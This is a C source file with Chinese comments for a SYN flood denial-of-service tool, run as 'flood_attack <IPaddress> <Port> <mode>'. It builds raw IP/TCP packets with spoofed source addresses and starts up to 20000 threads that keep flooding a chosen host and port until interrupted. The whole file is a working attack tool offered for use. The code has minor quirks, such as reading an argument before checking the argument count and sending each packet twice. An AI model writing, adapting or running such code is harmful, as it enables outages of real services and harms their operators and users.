#include "header/includeall.h"
#include "header/CRC16_check.h"
#include "header/init_header.h"
#include "header/IPs.h"
#include <unistd.h>
/* 最多線程數 */
#define MAXCHILD 20000

/* 原始套接字 */
int sockfd;

/* 程序活動標誌 */
static int alive = -1;

char dst_ip[20] = { 0 };
int dst_port;



/* mode */
char mode;

/* 發送SYN包函数
 * 填寫IP頭部，TCP頭部
 * TCP偽頭部僅用於校驗和的计算
 */
void* attack(void *addr_info){
    	struct sockaddr_in *addr = (struct sockaddr_in *)addr_info;
	char buf[100], sendbuf[100];
	int len;
	struct iphdr ip_hdr;			//IP頭部
	struct tcphdr tcp_hdr;		//TCP頭部
	struct pseudohdr pseudoheader;	//TCP偽頭部


	len = sizeof(struct iphdr) + sizeof(struct tcphdr);

	/* 初始化頭部 
	tcp_init_header(&ip_hdr, &tcp_hdr, &pseudoheader, dst_ip, dst_port, mode);*/
	printf("len: %d", len);
	
	/* random seed */
	time_t t;
	srand((unsigned) time(&t));
	
	/* 處於活動狀態時持續發送SYN包 */
	while(alive){
		/* 初始化頭部 */
		tcp_init_header(&ip_hdr, &tcp_hdr, &pseudoheader, dst_ip, dst_port, mode);
		
		ip_hdr.saddr = getSAddr();

		//計算IP校驗和
		bzero(buf, sizeof(buf));
		memcpy(buf , &ip_hdr, sizeof(struct iphdr));
		ip_hdr.check = check_sum((u_short *) buf, sizeof(struct iphdr));

		pseudoheader.saddr = ip_hdr.saddr;

		//計算TCP校驗和
		bzero(buf, sizeof(buf));
		memcpy(buf , &pseudoheader, sizeof(pseudoheader));
		memcpy(buf+sizeof(pseudoheader), &tcp_hdr, sizeof(struct tcphdr));
		tcp_hdr.th_sum = check_sum((u_short *) buf, sizeof(pseudoheader)+sizeof(struct tcphdr));

		bzero(sendbuf, sizeof(sendbuf));
		memcpy(sendbuf, &ip_hdr, sizeof(struct iphdr));
		memcpy(sendbuf+sizeof(struct iphdr), &tcp_hdr, sizeof(struct tcphdr));
		printf(".");
		sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr));
		/*pthread_exit(NULL);EXIT Thread*/
		if (sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr))< 0){
			perror("sendto()");
			pthread_exit("fail");
		}
		
		//sleep(1);
	}
	
}

/* 信號處理函數,設置退出變量alive */
void sig_int(int signo){
	alive = 0;
}

/* 主函數 */
int main(int argc, char *argv[]){
	struct sockaddr_in addr;
	struct hostent * host = NULL;

	int on = 1;
	int i = 0;
	pthread_t pthread[MAXCHILD];
	int err = -1;

	mode = (char)*argv[3];
	alive = 1;
	/* 截取信號CTRL+C */
	signal(SIGINT, sig_int);

	/* 参數是否數量正鴂 */
	if(argc < 4 || argc > 4){
		printf("usage: flood_attack <IPaddress> <Port> <mode>\n");
		exit(1);
	}

	strncpy( dst_ip, argv[1], 16 );
	dst_port = atoi( argv[2] );

	bzero(&addr, sizeof(addr));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(dst_port);

	if(inet_addr(dst_ip) == INADDR_NONE){
		/* 為DNS地址，查詢並轉換成IP地址 */
		host = gethostbyname(argv[1]);
		if(host == NULL){
			perror("gethostbyname()");
			exit(1);
		}
		addr.sin_addr = *((struct in_addr*)(host->h_addr));
		strncpy( dst_ip, inet_ntoa(addr.sin_addr), 16 );
	}
	else
		addr.sin_addr.s_addr = inet_addr(dst_ip);

	if( dst_port < 0 || dst_port > 65535 ){
		printf("Port Error\n");
		exit(1);
	}

	printf("host ip=%s\n", inet_ntoa(addr.sin_addr));

	/* 建立原始socket */
	sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);	
	if (sockfd < 0){
		perror("socket()");
		exit(1);
	}
	/* 設置IP選項 */
	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof (on)) < 0){
		perror("setsockopt()");
		exit(1);
	}

	/* 將程序的權限修改為普通用户 */
	setuid(getpid());

	/* 建立多个線程協同工作 */
	
	for(i=0; i<MAXCHILD; i++){
		err = pthread_create(&pthread[i], NULL, attack, (void *)&addr);
		if(err != 0){
			perror("pthread_create()");
			exit(EXIT_FAILURE);
		}
	}
	
	/*等待结束線程*/
	for(i=0; i<MAXCHILD; i++){
		//pthread_exit(NULL);
		err = pthread_join(pthread[i], NULL);
		if(err != 0){
			perror("pthread_join Error\n");
			exit(EXIT_FAILURE);
		}	
	}
	close(sockfd);
	return 0;
}
